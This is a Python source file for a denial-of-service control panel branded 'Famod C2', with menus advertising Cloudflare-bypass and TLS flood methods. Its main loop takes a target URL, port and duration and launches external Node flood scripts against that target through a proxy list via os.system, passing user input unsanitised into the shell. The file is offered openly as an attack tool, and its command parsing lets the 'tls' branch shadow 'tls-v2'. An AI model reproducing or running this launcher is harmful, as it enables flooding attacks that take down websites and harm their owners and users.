import socket
import os
import requests
import random
from pystyle import Colors, Colorate, Center
import getpass
import time
from time import sleep
import sys
import threading
import subprocess
import os
import requests,os,time,re,json,uuid,random,sys
from concurrent.futures import ThreadPoolExecutor
import colorama
import threading 
import aiohttp
import asyncio
import multiprocess
import sys
from pystyle import *
import os
import urllib
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)







os.system("cls" if os.name == "nt" else "clear")
print(f"Welcome To Famod C2 Fake!!")
print("Please wait...")
os.system("cls" if os.name == "nt" else "clear")
ip = requests.get('https://api.ipify.org').text.strip()
online = random.randint(1, 153)
def si():
    print(f'''   \x1b[38;2;0;255;255m[W\x1b[38;2;1;252;255mel\x1b[38;2;3;249;255mco\x1b[38;2;4;247;255mme\x1b[38;2;6;244;255m To\x1b[38;2;9;239;255m F\x1b[38;2;10;237;255ma\x1b[38;2;12;234;255mm\x1b[38;2;13;232;255mo\x1b[38;2;15;229;255md\x1b[38;2;18;224;255m C\x1b[38;2;19;221;255m2]\x1b[38;2;21;219;255m \x1b[38;2;22;216;255m \x1b[38;2;48;173;255m    [T\x1b[38;2;49;170;255me\x1b[38;2;51;168;255ml\x1b[38;2;52;165;255me ● \x1b[38;2;54;163;255m@n\x1b[38;2;55;160;255mmi\x1b[38;2;57;158;255mn\x1b[38;2;58;155;255mh\x1b[38;2;60;153;255m2\x1b[38;2;61;150;255m3]''')

###My ip####
def mip():
    print(f"""[0mYour IP Is [40;38;2;127;0;255m{ip}[0m""")
###Account###
def account():
    print(f"""[0mID: [38;2;255;0;255mUnknown[0m
[0mUsername: [38;2;255;0;255m
[0mAdmin: false
[0mReseller: false
[0mVIP: true
[0mBypass Blacklist: false
""")

def help():
    os.system("cls" if os.name == "nt" else "clear")
    si()
    print(f'''
\x1b[38;2;0;255;255m
		╭╮╱╭╮╱╱╭╮╱╱╱╱╭━╮╭━╮
		┃┃╱┃┃╱╱┃┃╱╱╱╱┃┃╰╯┃┃
		┃╰━╯┣━━┫┃╭━━╮┃╭╮╭╮┣━━┳━╮╭╮╭╮
		┃╭━╮┃┃━┫┃┃╭╮┃┃┃┃┃┃┃┃━┫╭╮┫┃┃┃
		┃┃╱┃┃┃━┫╰┫╰╯┃┃┃┃┃┃┃┃━┫┃┃┃╰╯┃
		╰╯╱╰┻━━┻━┫╭━╯╰╯╰╯╰┻━━┻╯╰┻━━╯
		╱╱╱╱╱╱╱╱╱┃┃
		╱╱╱╱╱╱╱╱╱╰╯
                     Welcome to Help Menu Of FAMOD C2!
              ═══╦════════════════════════════════════════╦════
     ╔═══════════╩══════════════════════╗╔════════════════╩═════════════════╗
     ║ Layer4  ---> Method Ddos L4      ║║ Info ---> View Your Plan Details ║
     ║ Methods ---> View Methods Pages  ║║ Clear ---> Clear the Terminal    ║
     ╚══════════════════════════════════╝╚══════════════════════════════════╝
            ''')
def meth():
    os.system('cls' if os.name == 'nt' else 'clear')
    si()
    print(f'''
  
 \x1b[38;2;0;255;255m              🚀 𝓝𝓮𝔀 𝓛𝓪𝔂𝓮𝓻7 𝓦𝓲𝓽𝓱 𝓟𝓸𝔀𝓮𝓻, 𝓔𝓷𝓱𝓪𝓷𝓬𝓮𝓭 𝓐𝓽𝓽𝓪𝓬𝓴𝓼 🚀
         ╔════════════════════════════════════════════════════════════╗
              STATUS           METHODS              DESCRIPTION
           ═══╦═════╦═══   ════╦═════╦════    ════════╦═════╦════════
           ╔══╩═════╩══╗   ╔═══╩═════╩═══╗    ╔═══════╩═════╩═══════╗
           ║  \033[1;33mONLINE  \x1b[38;2;0;255;255m ║   ║  \033[1;31mBYPASS  \x1b[38;2;0;255;255m   ║    ║  \033[1;34mBYPASS CLOUDFLARE  \x1b[38;2;0;255;255m║
          \x1b[38;2;0;255;255m ║  \033[1;33mONLINE  \x1b[38;2;0;255;255m ║   ║  \033[1;31mTLS       \x1b[38;2;0;255;255m ║    ║  \033[1;34mTLS OPTIMIZED      \x1b[38;2;0;255;255m║
          \x1b[38;2;0;255;255m ║  \033[1;33mONLINE  \x1b[38;2;0;255;255m ║   ║  \033[1;31mTLS-V2    \x1b[38;2;0;255;255m ║    ║  \033[1;34mTLS FLOOD V2       \x1b[38;2;0;255;255m║
          \x1b[38;2;0;255;255m ║  \033[1;33mONLINE  \x1b[38;2;0;255;255m ║   ║  \033[1;31mHTTP-RAW   \x1b[38;2;0;255;255m║    ║  \033[1;34mHIGH REQ (NO CFL)  \x1b[38;2;0;255;255m║
           \x1b[38;2;0;255;255m║  \033[1;33mONLINE  \x1b[38;2;0;255;255m ║   ║  \033[1;31mHTTPS      \x1b[38;2;0;255;255m║    ║  \033[1;34mKILLED WEBSITE    \x1b[38;2;0;255;255m ║
         \x1b[38;2;0;255;255m  ╚═══════════╝  \x1b[38;2;0;255;255m ╚═════════════╝    \x1b[38;2;0;255;255m╚═════════════════════╝
           ╔════════════════════════════════════════════════════════╗
           ║         \033[1;34mWelcome to FAMOD C2 Methods Pages.         \x1b[38;2;0;255;255m    ║
           \x1b[38;2;0;255;255m╚════════════════════════════════════════════════════════╝
          \033[1;31m  If you spam attack, you will be banned from FA MOD C2
         ╚════════════════════════════════════════════════════════════╝
''')
def menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(f'''   \x1b[38;2;0;255;255m[W\x1b[38;2;1;252;255mel\x1b[38;2;3;249;255mco\x1b[38;2;4;247;255mme \x1b[38;2;6;244;255m To\x1b[38;2;9;239;255m F\x1b[38;2;10;237;255ma\x1b[38;2;12;234;255mm\x1b[38;2;13;232;255mo\x1b[38;2;15;229;255md\x1b[38;2;18;224;255m C\x1b[38;2;19;221;255m2]\x1b[38;2;21;219;255m \x1b[38;2;22;216;255m \x1b[38;2;48;173;255m    [T\x1b[38;2;49;170;255me\x1b[38;2;51;168;255ml\x1b[38;2;52;165;255me ● \x1b[38;2;54;163;255m@n\x1b[38;2;55;160;255mmi\x1b[38;2;57;158;255mn\x1b[38;2;58;155;255mh\x1b[38;2;60;153;255m2\x1b[38;2;61;150;255m3]
 
   \x1b[38;2;0;255;255m⣿\x1b[38;2;1;252;255m⣿\x1b[38;2;3;249;255m⣿\x1b[38;2;4;247;255m⣿\x1b[38;2;7;242;255m⣿\x1b[38;2;9;239;255m⣿\x1b[38;2;10;237;255m⣿\x1b[38;2;12;234;255m⣿\x1b[38;2;12;234;255m⣿\x1b[38;2;13;232;255m⣿\x1b[38;2;16;226;255m⣿\x1b[38;2;18;224;255m⣿\x1b[38;2;21;219;255m⣿\x1b[38;2;22;216;255m⣿⣿\x1b[38;2;25;211;255m⣿⣿\x1b[38;2;28;206;255m⣷⣿\x1b[38;2;30;204;255m⣿⠿\x1b[38;2;33;198;255m⣿⣿⣿\x1b[38;2;40;186;255m⣿⣿\x1b[38;2;43;181;255m⣿⣿\x1b[38;2;45;178;255m⣿⣿\x1b[38;2;46;175;255m⣿⣿
   \x1b[38;2;0;255;255m⣿\x1b[38;2;1;252;255m⣿\x1b[38;2;3;249;255m⣿\x1b[38;2;4;247;255m⣿\x1b[38;2;7;242;255m⣿\x1b[38;2;9;239;255m⣿\x1b[38;2;10;237;255m⣿\x1b[38;2;12;234;255m⣿\x1b[38;2;12;234;255m⢿\x1b[38;2;13;232;255m⣿\x1b[38;2;16;226;255m⣿\x1b[38;2;18;224;255m⣿\x1b[38;2;21;219;255m⣿\x1b[38;2;22;216;255m⣿⣿\x1b[38;2;25;211;255m⣿⣿\x1b[38;2;28;206;255m⣿⣿\x1b[38;2;30;204;255m⣿⣌\x1b[38;2;33;198;255m⣼⣿⣿\x1b[38;2;40;186;255m⣿⣿\x1b[38;2;43;181;255m⣿⣿\x1b[38;2;45;178;255m⣿⣿\x1b[38;2;46;175;255m⣿⣿
   \x1b[38;2;0;255;255m⣿\x1b[38;2;1;252;255m⣿\x1b[38;2;3;249;255m⣿\x1b[38;2;4;247;255m⣿\x1b[38;2;7;242;255m⣿\x1b[38;2;9;239;255m⣿\x1b[38;2;10;237;255m⠿\x1b[38;2;12;234;255m⢋\x1b[38;2;12;234;255m⡘\x1b[38;2;13;232;255m⠿\x1b[38;2;16;226;255m⣿\x1b[38;2;18;224;255m⣿\x1b[38;2;21;219;255m⠿\x1b[38;2;22;216;255m⠟⣛\x1b[38;2;25;211;255m⣛⣛\x1b[38;2;28;206;255m⣛⠻\x1b[38;2;30;204;255m⠿⣿\x1b[38;2;33;198;255m⣿⣿⣿\x1b[38;2;40;186;255m⣿⣿\x1b[38;2;43;181;255m⣿⣿\x1b[38;2;45;178;255m⣿⣿\x1b[38;2;46;175;255m⣿⣿  \033[1;38;2;204;0;102m🚀Type "help" for the help page
   \x1b[38;2;0;255;255m⣿\x1b[38;2;1;252;255m⣿\x1b[38;2;3;249;255m⣿\x1b[38;2;4;247;255m⣿\x1b[38;2;7;242;255m⣿\x1b[38;2;9;239;255m⣿\x1b[38;2;10;237;255m⣿\x1b[38;2;12;234;255m⣧\x1b[38;2;12;234;255m⣰\x1b[38;2;13;232;255m⡿\x1b[38;2;16;226;255m⢋\x1b[38;2;18;224;255m⣵\x1b[38;2;21;219;255m⣾\x1b[38;2;22;216;255m⣿⣿\x1b[38;2;25;211;255m⣿⣿\x1b[38;2;28;206;255m⣿⣿\x1b[38;2;30;204;255m⣷⣦\x1b[38;2;33;198;255m⣙⢿⣿\x1b[38;2;40;186;255m⣿⣿\x1b[38;2;43;181;255m⣿⣿\x1b[38;2;45;178;255m⣿⣿\x1b[38;2;46;175;255m⣿⣿  \x1b[38;2;0;255;255m⚡Owner : @nminh23
   \x1b[38;2;0;255;255m⣿\x1b[38;2;1;252;255m⣿\x1b[38;2;3;249;255m⣿\x1b[38;2;4;247;255m⣿\x1b[38;2;7;242;255m⣿\x1b[38;2;9;239;255m⣿\x1b[38;2;10;237;255m⣿\x1b[38;2;12;234;255m⣿\x1b[38;2;12;234;255m⠏\x1b[38;2;13;232;255m⣴\x1b[38;2;16;226;255m⣿\x1b[38;2;18;224;255m⣿\x1b[38;2;21;219;255m⣿\x1b[38;2;22;216;255m⣿⣿\x1b[38;2;25;211;255m⣿⣿\x1b[38;2;28;206;255m⣿⣿\x1b[38;2;30;204;255m⣿⣿\x1b[38;2;33;198;255m⣿⣧⡉\x1b[38;2;40;186;255m⠉⠭\x1b[38;2;43;181;255m⠉⣙\x1b[38;2;45;178;255m⠛⠿\x1b[38;2;46;175;255m⣿⣿  \x1b[38;2;78;122;255m♨️ Telegram Channel : t.me/Famodd
   \x1b[38;2;0;255;255m⣿\x1b[38;2;1;252;255m⣿\x1b[38;2;3;249;255m⣿\x1b[38;2;4;247;255m⣿\x1b[38;2;7;242;255m⣿\x1b[38;2;9;239;255m⣿\x1b[38;2;10;237;255m⡿\x1b[38;2;12;234;255m⠏\x1b[38;2;12;234;255m⣼\x1b[38;2;13;232;255m⣿\x1b[38;2;16;226;255m⣿\x1b[38;2;18;224;255m⣿\x1b[38;2;21;219;255m⣿\x1b[38;2;22;216;255m⣿⣿\x1b[38;2;25;211;255m⣿⣿\x1b[38;2;28;206;255m⣿⣿\x1b[38;2;30;204;255m⣿⣿\x1b[38;2;33;198;255m⣿⣿⣷\x1b[38;2;40;186;255m⠠⣍\x1b[38;2;43;181;255m⢳⣦\x1b[38;2;45;178;255m⡙⣷\x1b[38;2;46;175;255m⡘⣿  \033[1;33m🔪Version : [5.0.0]
   \x1b[38;2;0;255;255m⣿\x1b[38;2;1;252;255m⣿\x1b[38;2;3;249;255m⣿\x1b[38;2;4;247;255m⠟\x1b[38;2;7;242;255m⡋\x1b[38;2;9;239;255m⢁\x1b[38;2;10;237;255m⡠\x1b[38;2;12;234;255m⣿\x1b[38;2;12;234;255m⣿\x1b[38;2;13;232;255m⣿\x1b[38;2;16;226;255m⣿\x1b[38;2;18;224;255m⣿\x1b[38;2;21;219;255m⣿\x1b[38;2;22;216;255m⣿⣿\x1b[38;2;25;211;255m⣿⣿\x1b[38;2;28;206;255m⣿⣿\x1b[38;2;30;204;255m⣿⣿\x1b[38;2;33;198;255m⣿⣿⣿\x1b[38;2;40;186;255m⠇⢋\x1b[38;2;43;181;255m⡼⢟\x1b[38;2;45;178;255m⣴⠟\x1b[38;2;46;175;255m⣴⣿  \033[1;35m🏹Type "exit" to end panel Famod C2
   \x1b[38;2;0;255;255m⣯\x1b[38;2;1;252;255m⣿\x1b[38;2;3;249;255m⣡\x1b[38;2;4;247;255m⠎\x1b[38;2;7;242;255m⣴\x1b[38;2;9;239;255m⡏\x1b[38;2;10;237;255m⣾\x1b[38;2;12;234;255m⡀\x1b[38;2;12;234;255m⣿\x1b[38;2;13;232;255m⣿\x1b[38;2;16;226;255m⣿\x1b[38;2;18;224;255m⣿\x1b[38;2;21;219;255m⣿\x1b[38;2;22;216;255m⣿⣿\x1b[38;2;25;211;255m⣿⣿\x1b[38;2;28;206;255m⣿⣿\x1b[38;2;30;204;255m⠿⠟\x1b[38;2;33;198;255m⣛⡩⠴\x1b[38;2;40;186;255m⢚⡩\x1b[38;2;43;181;255m⠔⣫\x1b[38;2;45;178;255m⣴⣿\x1b[38;2;46;175;255m⣿⣿  \x1b[38;2;78;122;255m🔎Your Ip : [{ip}]
   \x1b[38;2;0;255;255m⣷\x1b[38;2;1;252;255m⣟\x1b[38;2;3;249;255m⢿\x1b[38;2;4;247;255m⣆\x1b[38;2;7;242;255m⡛\x1b[38;2;9;239;255m⠷\x1b[38;2;10;237;255m⠦\x1b[38;2;12;234;255m⣥\x1b[38;2;12;234;255m⣉\x1b[38;2;13;232;255m⣛\x1b[38;2;16;226;255m⣛\x1b[38;2;18;224;255m⣛\x1b[38;2;21;219;255m⣋\x1b[38;2;22;216;255m⣉⠭\x1b[38;2;25;211;255m⠭⠥\x1b[38;2;28;206;255m⠖⣒\x1b[38;2;30;204;255m⡊⠭\x1b[38;2;33;198;255m⠄⣒⡩\x1b[38;2;40;186;255m⣰⣾\x1b[38;2;43;181;255m⡿⠿\x1b[38;2;45;178;255m⣿⣿\x1b[38;2;46;175;255m⣿⣿  \033[1;91m📣Your Account :[]
   \x1b[38;2;0;255;255m⣟\x1b[38;2;1;252;255m⣿\x1b[38;2;3;249;255m⣷\x1b[38;2;4;247;255m⣬\x1b[38;2;7;242;255m⣭\x1b[38;2;9;239;255m⣙\x1b[38;2;10;237;255m⣒\x1b[38;2;12;234;255m⣒\x1b[38;2;12;234;255m⣒\x1b[38;2;13;232;255m⠒\x1b[38;2;16;226;255m⣒\x1b[38;2;18;224;255m⣒\x1b[38;2;21;219;255m⣒\x1b[38;2;22;216;255m⣒⣀\x1b[38;2;25;211;255m⣬⣭\x1b[38;2;28;206;255m⣤⣶\x1b[38;2;30;204;255m⣶⣿\x1b[38;2;33;198;255m⣿⠟⣰\x1b[38;2;40;186;255m⣿⣿\x1b[38;2;43;181;255m⣧⣡\x1b[38;2;45;178;255m⣿⣿\x1b[38;2;46;175;255m⣿⣿  \033[1;32m🛸Vip Account : [true]
   \x1b[38;2;0;255;255m⣿\x1b[38;2;1;252;255m⣿\x1b[38;2;3;249;255m⣿\x1b[38;2;4;247;255m⣿\x1b[38;2;7;242;255m⣿\x1b[38;2;9;239;255m⣿\x1b[38;2;10;237;255m⣿\x1b[38;2;12;234;255m⣿\x1b[38;2;12;234;255m⣿\x1b[38;2;13;232;255m⣷\x1b[38;2;16;226;255m⣬\x1b[38;2;18;224;255m⡛\x1b[38;2;21;219;255m⠿\x1b[38;2;22;216;255m⣿⣿\x1b[38;2;25;211;255m⣿⣿\x1b[38;2;28;206;255m⣿⣿\x1b[38;2;30;204;255m⠿⢛\x1b[38;2;33;198;255m⣡⣾⣿\x1b[38;2;40;186;255m⠏⠹\x1b[38;2;43;181;255m⣿⣿\x1b[38;2;45;178;255m⣿⣿\x1b[38;2;46;175;255m⣿⣿  \x1b[38;2;255;165;0m🚫Black List : [false]
   \x1b[38;2;0;255;255m⣿\x1b[38;2;1;252;255m⣿\x1b[38;2;3;249;255m⣿\x1b[38;2;4;247;255m⣿\x1b[38;2;7;242;255m⣿\x1b[38;2;9;239;255m⣧\x1b[38;2;10;237;255m⣀\x1b[38;2;12;234;255m⣿\x1b[38;2;12;234;255m⣿\x1b[38;2;13;232;255m⣿\x1b[38;2;16;226;255m⣿\x1b[38;2;18;224;255m⣿\x1b[38;2;21;219;255m⣷\x1b[38;2;22;216;255m⣶⣦\x1b[38;2;25;211;255m⣭⣭\x1b[38;2;28;206;255m⣤⣶\x1b[38;2;30;204;255m⣾⣿\x1b[38;2;33;198;255m⣿⣿⣶\x1b[38;2;40;186;255m⡌⢡\x1b[38;2;43;181;255m⣶⣿\x1b[38;2;45;178;255m⣿⣿\x1b[38;2;46;175;255m⣿⣿
   \x1b[38;2;0;255;255m⣿\x1b[38;2;1;252;255m⣿\x1b[38;2;3;249;255m⣿\x1b[38;2;4;247;255m⣿\x1b[38;2;7;242;255m⣿\x1b[38;2;9;239;255m⣿\x1b[38;2;10;237;255m⣿\x1b[38;2;12;234;255m⣿\x1b[38;2;12;234;255m⣿\x1b[38;2;13;232;255m⣿\x1b[38;2;16;226;255m⣿\x1b[38;2;18;224;255m⣿\x1b[38;2;21;219;255m⣿\x1b[38;2;22;216;255m⣿⣿\x1b[38;2;25;211;255m⣿⣿\x1b[38;2;28;206;255m⣿⣿\x1b[38;2;30;204;255m⣿⣿\x1b[38;2;33;198;255m⣿⣿⣿\x1b[38;2;40;186;255m⣿⣿\x1b[38;2;43;181;255m⣿⣿\x1b[38;2;45;178;255m⣿⣿\x1b[38;2;46;175;255m⣿⣿
''')
def main():
    menu()
    while(True):
        cnc = input(f"\033[0;30;45m ● Famod➤➤\x1b[1;37m\033[0m")
        if cnc == "METHODS" or cnc == "methods" or cnc == "method":
            meth()
        elif cnc == "CLEAR" or cnc == "clear" or cnc == "cls":
            menu()
        elif cnc == "info" or cnc == "INFO" or cnc == "account":
            account()
        elif cnc == "HELP" or cnc == "Help" or cnc == "help":
            help()
        elif cnc == "exit" or cnc == "Exit" or cnc == "ex":
            exit()
        elif "http-raw" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                times=cnc.split()[3]    
                print("\033[1;38;2;204;0;102mAttack Has Been Successfully Sent""")
                time.sleep(1)
                print(f"""𝐅𝐀𝐌𝐎𝐃 𝐂𝟐""")
                time.sleep(1)
                print(f"""Method Use: [http-raw]""")
                time.sleep(1)
                print(f"""Target: [{url}] """)
                time.sleep(1)
                print(f"""Port: [{port}] """)
                time.sleep(1)
                print(f"""Duration: [{times}] """)
                time.sleep(1)
                print(f"""Sent By: [] """)
                os.system(f"node raw {url} {times}")
            except IndexError:
                print("Usage : http-raw <url> <port> <time>")
                print("Example : http-raw https://nm2302.site/ 443 60")
        elif "tls" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]                
                times=cnc.split()[3]
                
                
                print("\033[1;38;2;204;0;102mAttack Has Been Successfully Sent""")
                time.sleep(1)
                print(f"""𝐅𝐀𝐌𝐎𝐃 𝐂𝟐""")
                time.sleep(1)
                print(f"""Method Use: [tls]""")
                time.sleep(1)
                print(f"""Target: [{url}] """)
                time.sleep(1)
                print(f"""Port: [{port}] """)
                time.sleep(1)
                print(f"""Duration: [{times}] """)
                time.sleep(1)
                print(f"""Sent By: [] """)
                os.system(f"node tls.js {url} {times} 55 120 proxy.txt")
            except IndexError:
                print("Usage : tls <url> <port> <time>")
                print("Example : tls https://nm2302.site/ 443 60")
        elif "tls-v2" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]                
                times=cnc.split()[3]
                
                
                print("\033[1;38;2;204;0;102mAttack Has Been Successfully Sent""")
                time.sleep(1)
                print(f"""𝐅𝐀𝐌𝐎𝐃 𝐂𝟐""")
                time.sleep(1)
                print(f"""Method Use: [tls-v2]""")
                time.sleep(1)
                print(f"""Target: [{url}] """)
                time.sleep(1)
                print(f"""Port: [{port}] """)
                time.sleep(1)
                print(f"""Duration: [{times}] """)
                time.sleep(1)
                print(f"""Sent By: [] """)
                os.system(f"node tls-v2.js {url} {times} 55 120 proxy.txt")
            except IndexError:
                print("Usage : tls-v2 <url> <port> <time>")
                print("Example : tls-v2 https://nm2302.site/ 443 60")
        elif "bypass" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                times=cnc.split()[3]
                
                
                print("\033[1;38;2;204;0;102mAttack Has Been Successfully Sent""")
                time.sleep(1)
                print(f"""𝐅𝐀𝐌𝐎𝐃 𝐂𝟐""")
                time.sleep(1)
                print(f"""Method Use: [bypass]""")
                time.sleep(1)
                print(f"""Target: [{url}] """)
                time.sleep(1)
                print(f"""Port: [{port}] """)
                time.sleep(1)
                print(f"""Duration: [{times}] """)
                time.sleep(1)
                print(f"""Sent By: [] """)
                os.system(f"node bypass {url} {times} 55 120 proxy.txt")
            except IndexError:
                print("Usage : bypass <url> <port> <time>")
                print("Example : bypass https://nm2302.site/ 443 60")
        elif "https" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                times=cnc.split()[3]
                
                
                print("\033[1;38;2;204;0;102mAttack Has Been Successfully Sent""")
                time.sleep(1)
                print(f"""𝐅𝐀𝐌𝐎𝐃 𝐂𝟐""")
                time.sleep(1)
                print(f"""Method Use: [https]""")
                time.sleep(1)
                print(f"""Target: [{url}] """)
                time.sleep(1)
                print(f"""Port: [{port}] """)
                time.sleep(1)
                print(f"""Duration: [{times}] """)
                time.sleep(1)
                print(f"""Sent By: [] """)
                os.system(f"node https {url} {times} 55 120 proxy.txt")
            except IndexError:
                print("Usage : https <url> <port> <time>")
                print("Example : https https://nm2302.site/ 443 60")
        else:
            try:
                cmd=cnc.split()[0]
                print("=>> "+cmd+" Not Found!!")
            except IndexError:
                pass
            

main()